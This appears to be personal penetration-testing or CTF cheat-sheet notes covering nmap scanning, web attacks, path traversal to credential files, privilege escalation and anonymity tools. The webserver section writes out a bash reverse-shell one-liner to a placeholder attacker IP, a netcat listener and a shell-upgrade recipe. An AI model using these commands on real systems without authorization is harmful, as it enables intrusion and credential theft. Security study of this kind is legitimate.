# Target enumeration
1. `nmap <ip> -p-` (all ports) 
    - `-sU` (UDP) `-Pn` (skip host discovery)`
    - `-A` (implies `-O` (OS), `-sC` (scripts), `-sV` (version))
    - `-f` (fragment packets) `-D` (decoy)
2. Processes
    - `ps aux`
3. Ports
    - `ss`
    - `netstat -tunlp`
        - `-t` (TCP)
        - `-u` (UDP)
        - `-n` (No service resolution)
        - `-l` (Only listening)
        - `-p` (Process info)

    - `lsof`
4. Webservers
    - Spider website (e.g. using Burp Suite Proxy without intercept)
    - Enumerate subdomains and dirs (e.g. with `gobuster`)
    - Vulnerabilities with OWASP

# Webservers
1. Gain read access on webserver
    - Enumerate login forms
    - XSS, SQL-Injection
    - Path traversal
        - .htpasswd
        - /etc/passwd
        - /etc/group
2. Gain write access on webserver
    - Access OS shell
    - Set up reverse shell with `nc -lvnp <port>`
        - /usr/share/webshells/php/php-reverse-shell.php
        - `bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"`
    - Spawn fully interactive shell
        - `python3 -c 'import pty;pty.spawn("/bin/bash")'` CTRL+Z `stty raw -echo` `fg` `export TERM=xterm`
    - Use ssh if credentials found at some point
3. Search webserver
    - Interesting text data
        - `find . -type f -name '<glob pattern>' | xargs cat | grep -i <glob pattern>`
    - Binaries
        - Find binaries with permissions for user group `find / -group <group_name> 2>/dev/null`
        - Query infos about files `ls -la <path_to_file> && file <path_to_file>`
        - Append PATH `export PATH=<directory>:$PATH`
        - Check vulnerable binaries https://gtfobins.github.io/

# Privilege escalation
1. User permissions: `whoami`, `id`, `sudo -l`
2. User groups
    - `lxd`: Containers

# Network traffic
1. Monitor TCP/IP traffic (e.g. LDAP) `sudo tcpdump -i tun0 port 389`


# Password cracking
1. Use Google as Rainbow Table

## Windows
`impacket-psexec`

# Privacy
1. Tails
2. Proxychains with TOR